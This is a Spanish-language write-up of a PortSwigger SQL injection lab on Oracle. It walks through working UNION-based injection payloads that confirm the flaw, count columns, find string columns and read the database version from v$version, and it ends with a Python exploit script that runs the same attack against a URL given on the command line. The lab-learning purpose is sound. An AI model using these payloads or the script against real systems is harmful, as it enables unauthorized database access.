---
title: "07 SQL injection attack, querying the database type and version on Oracle"
collection: publications
category: portswigger
permalink: /publications/SQLi/07_SQL injection attack, querying the database type and version on Oracle
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION que consulta el tipo y la versión de la base de datos en Oracle.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection attack, querying the database type and version on Oracle'
---

![logo]({{site.url}}/images/SQLi/sqli-7/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-7/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, visualice la cadena de versión de la base de datos.

## Determinamos que el campo si es vulnerable

```javascript
' or 1=1--
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-7/vulnerable.png)

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.

```javascript
' ORDER BY 1--
' ORDER BY 2--
```

![Order by]({{site.url}}/images/SQLi/sqli-7/order by.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String', en esta ocación que es BD oracle necesitamos llamar a la tabla DUAL

```javascript
' UNION SELECT 'A', NULL FROM DUAL--
' UNION SELECT NULL, 'A' FROM DUAL-- 
' UNION SELECT 'A', 'A' FROM DUAL--
```

![String]({{site.url}}/images/SQLi/sqli-7/campos string.png)

## Miramos la versión de la BD

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Ya que sabemos que es una BD de Oracle probamos averiguar la versión de Oracle

![DB version]({{site.url}}/images/SQLi/sqli-7/DB version.png)

```javascript
' UNION SELECT banner, NULL FROM v$version--
```

![version]({{site.url}}/images/SQLi/sqli-7/version.png)

# Resuelto

![Aprobado]({{site.url}}images/SQLi/sqli-7/aprobado.png)

# Codigo Python
```javascript
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT banner, NULL from v$version--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Found the database version.")
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile(r'.*Oracle\sDatabase.*'))
        print("[+] The Oracle database version is: "+ version)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s wwww.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")
```